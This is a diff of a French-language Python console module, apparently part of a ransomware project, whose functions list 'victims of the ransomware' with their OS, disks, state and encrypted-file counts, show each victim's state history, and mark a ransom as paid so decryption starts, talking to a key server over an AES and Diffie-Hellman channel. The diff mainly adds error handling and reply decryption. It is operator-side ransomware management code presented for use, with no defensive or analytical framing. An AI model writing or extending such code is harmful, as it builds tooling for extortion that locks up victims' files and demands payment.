@@ -33,35 +33,43 @@ def affichage_menu():
 
 
 def affichage_liste_victimes():
-
     print("")
     print("============================================================================")
     print("LISTING DES VICTIMES DU RANSOMWARE")
     print("============================================================================")
-    # Envoi de la requête
-    s = network.connect_to_serv(network.LOCAL_IP, network.PORT_SERV_CLES, retry=10)
-    key = security.diffie_hellman_send_key(s)
-    print(f"Clé de chiffrement envoyée : {key}")
-    msg = message.set_message("LIST_REQ")
-    encrypted_msg = security.aes_encrypt(msg, key)
-    network.send_message(s, encrypted_msg)
-    response = network.receive_message(s)
-    if response is None:
-        print("Aucune réponse reçue.")
-        return
-    # affiche les données reçues
-    while response is not None and message.get_message_type(response) != 'LIST_END':
-        data = list(response.values())
-        print(
-            f"ID : {data[0]} | HASH: {data[1]} | OS: {data[2]} | Disks: {data[3]} | State: {data[4]} | Nb_files: {data[5]}")
-        response = network.receive_message(s)
-    #deconnexion
-    s.close()
-    #Verifie si bien fermé
-    if s._closed:
-        print("Connexion fermée avec le serveur.")
-    else:
-        print("Erreur lors de la fermeture de la connexion avec le serveur.")
+    try:
+        # Connexion au serveur
+        s = network.connect_to_serv(network.LOCAL_IP, network.PORT_SERV_CLES, retry=10)
+        key = security.diffie_hellman_send_key(s)
+        msg = message.set_message("LIST_REQ")
+        encrypted_msg = security.aes_encrypt(msg, key)
+        network.send_message(s, encrypted_msg)
+
+        while True:
+            response_encrypted = network.receive_message(s)
+            if not response_encrypted:
+                break  # Si aucune réponse n'est reçue, sortir de la boucle
+            response = security.aes_decrypt(response_encrypted, key)
+
+            if response is None:
+                print("Aucune réponse reçue.")
+                return
+            else:
+                data = list(response.values())
+                print(
+                    f"ID : {data[0]} | HASH: {data[1]} | OS: {data[2]} | Disks: {data[3]} | State: {data[4]} | Nb_files: {data[5]}")
+
+            if message.get_message_type(response) == 'LIST_END':
+                break  # Si c'est la fin de la liste, sortir de la boucle
+    except Exception as e:
+        print(f"Erreur lors de la communication avec le serveur : {e}")
+    finally:
+        if s:
+            s.close()
+            if s._closed:
+                print("Connexion fermée avec le serveur.")
+            else:
+                print("Erreur lors de la fermeture de la connexion avec le serveur.")
 
 
 def affichage_historique_etat_victime():
@@ -69,34 +77,45 @@ def affichage_historique_etat_victime():
     print("============================================================================")
     print("HISTORIQUE DES ETATS DE LA VICTIME")
     print("============================================================================")
-    # Connexion au serveur
-    s = network.connect_to_serv(network.LOCAL_IP, network.PORT_SERV_CLES, retry=10)
-    key = security.diffie_hellman_send_key(s)
-    # Récupération de l'id de la victime
-    victim_id = input("Entrez le numéro de la victime : ")
-    # Envoi de la requête
-    msg = message.set_message("HIST_REQ", victim_id)
-    encrypted_msg = security.aes_encrypt(msg, key)
-    network.send_message(s, encrypted_msg)
+    try:
+        # Connexion au serveur de clés
+        s = network.connect_to_serv(network.LOCAL_IP, network.PORT_SERV_CLES, retry=10)
+        key = security.diffie_hellman_send_key(s)
 
-    # Récupération de la réponse
-    response = network.receive_message(s)
-    if response is None:
-        print("Aucune réponse reçue.")
-        return
-    # Affichage de l'historique
-    while response is not None and message.get_message_type(response) != 'HIST_END':
-        data = list(response.values())
-        print(
-            f"ID_STATES: {data[0]} | ID_VICTIM: {data[1]} | TIMESTAMP: {format_timestamp(data[2])} | STATE: {data[3]}")
-        response = network.receive_message(s)
-    # deconnexion
-    s.close()
-    # Verifie si bien fermé
-    if s._closed:
-        print("Connexion fermée avec le serveur.")
-    else:
-        print("Erreur lors de la fermeture de la connexion avec le serveur.")
+        # Récupération de l'id de la victime
+        victim_id = input("Entrez le numéro de la victime : ")
+
+        # Envoi de la requête
+        msg = message.set_message("HIST_REQ", victim_id)
+        encrypted_msg = security.aes_encrypt(msg, key)
+        network.send_message(s, encrypted_msg)
+
+        # Récupération de la réponse
+        while True:
+            response_encrypted = network.receive_message(s)
+            if not response_encrypted:
+                break  # Si aucune réponse n'est reçue, sortir de la boucle
+            response = security.aes_decrypt(response_encrypted, key)
+
+            if response is None:
+                print("Aucune réponse reçue.")
+                return
+            else:
+                data = list(response.values())
+                print(
+                    f"ID_STATES: {data[0]} | ID_VICTIM: {data[1]} | TIMESTAMP: {format_timestamp(data[2])} | STATE: {data[3]}")
+
+            if message.get_message_type(response) == 'LIST_END':
+                break  # Si c'est la fin de la liste, sortir de la boucle
+    except Exception as e:
+        print(f"Erreur lors de la communication avec le serveur : {e}")
+    finally:
+        if s:
+            s.close()
+            if s._closed:
+                print("Connexion fermée avec le serveur.")
+            else:
+                print("Erreur lors de la fermeture de la connexion avec le serveur.")
 
 
 def affichage_payement_rancon():
@@ -104,37 +123,54 @@ def affichage_payement_rancon():
     print("")
     print("RENSEIGNER LE PAYEMENT DE RANCON D'UNE VICTIME")
     print("______________________________________________")
-    # Connexion au serveur
-    s = network.connect_to_serv(network.LOCAL_IP, network.PORT_SERV_CLES, retry=10)
-    key = security.diffie_hellman_send_key(s)
-    # Récupération de l'id de la victime
-    victim_id = input("Entrez le numéro de la victime : ")
-    # Envoi de la requête
-    msg = message.set_message("CHANGE_STATE", victim_id)
-    encrypted_msg = security.aes_encrypt(msg, key)
-    network.send_message(s, encrypted_msg)
-    #encrypted_id = security.aes_encrypt(victim_id, key)
-    #network.send_message(s, encrypted_id)
-    # Récupération de la réponse
-    response = network.receive_message(s)
-    if response is None:
-        print("Aucune réponse reçue.")
-        return
-    # Affichage de la réponse en fonction de l'état de la victime
-    chgstate_value = response['CHGSTATE']
-    if chgstate_value == "DECRYPT":
-        print(f"La victime {victim_id} a payé la rançon. Décryptage en cours...")
-    elif chgstate_value == "DECRYPTED":
-        print(f"La victime {victim_id} a déja payé et est en cours de décryptage.")
-    else:
-        print(f"La victime {victim_id} est dans l'état {chgstate_value} et donc nous ne pouvons pas la décrypter.")
-    # deconnexion
-    s.close()
-    # Verifie si bien fermé
-    if s._closed:
-        print("Connexion fermée avec le serveur.")
-    else:
-        print("Erreur lors de la fermeture de la connexion avec le serveur.")
+    try:
+        # Connexion au serveur de clés
+        s = network.connect_to_serv(network.LOCAL_IP, network.PORT_SERV_CLES, retry=10)
+        print("Connexion au serveur établie.")
+
+        key = security.diffie_hellman_send_key(s)
+        print("Clé partagée échangée avec succès.")
+
+        # Récupération de l'id de la victime
+        victim_id = input("Entrez le numéro de la victime : ")
+        print(f"ID de la victime entré : {victim_id}")
+
+        # Envoi de la requête
+        msg = message.set_message("CHGSTATE", victim_id)
+        encrypted_msg = security.aes_encrypt(msg, key)
+        network.send_message(s, encrypted_msg)
+        print("Requête de changement d'état envoyée.")
+
+        # Attente de la réponse
+        response = network.receive_message(s)
+        print("Réponse reçue du serveur.")
+
+        if not response:
+            print("Aucune réponse reçue.")
+            return
+
+        response = security.aes_decrypt(response, key)
+        print("Réponse déchiffrée avec succès.")
+
+        # Affichage de la réponse en fonction de l'état de la victime
+        chgstate_value = response.get('CHGSTATE')
+
+        if chgstate_value == "DECRYPT":
+            print(f"La victime {victim_id} a payé la rançon. Décryptage en cours...")
+        elif chgstate_value == "DECRYPTED":
+            print(f"La victime {victim_id} a déjà payé et est en cours de décryptage.")
+        else:
+            print(f"La victime {victim_id} est dans l'état {chgstate_value} et donc nous ne pouvons pas la décrypter.")
+    except Exception as e:
+        print(f"Erreur lors de la communication avec le serveur : {e}")
+    finally:
+        if s:
+            s.close()
+            if s._closed:
+                print("Connexion fermée avec le serveur.")
+            else:
+                print("Erreur lors de la fermeture de la connexion avec le serveur.")
+
 
 def main():
     continuer = True
